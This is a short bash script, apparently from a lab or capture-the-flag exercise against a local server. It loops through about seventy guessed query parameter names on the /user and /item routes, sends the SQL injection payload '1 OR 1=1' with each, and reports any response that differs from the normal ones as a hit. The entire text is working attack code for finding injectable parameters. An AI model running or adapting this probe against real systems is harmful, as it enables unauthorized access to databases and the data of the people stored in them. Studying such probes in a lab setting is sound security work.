H='http://127.0.0.1:8897'
names="id p q u user name n uid key k v val s search item idx i pid num no page cat category sel select where filter w arg param x y z a b c d t mode type url file path f dir query sql row rec record e obj order ord oid product sku code ref slug id2 p1 n1"
for route in user item; do
 echo "### /$route"
 for nm in $names; do
   b=$(curl -s -G --data-urlencode "${nm}=1 OR 1=1" "$H/$route")
   case "$b" in "user: none"|"[[]]"*"incomplete input"*) ;; *) echo "  HIT $nm -> $b";; esac
 done
done
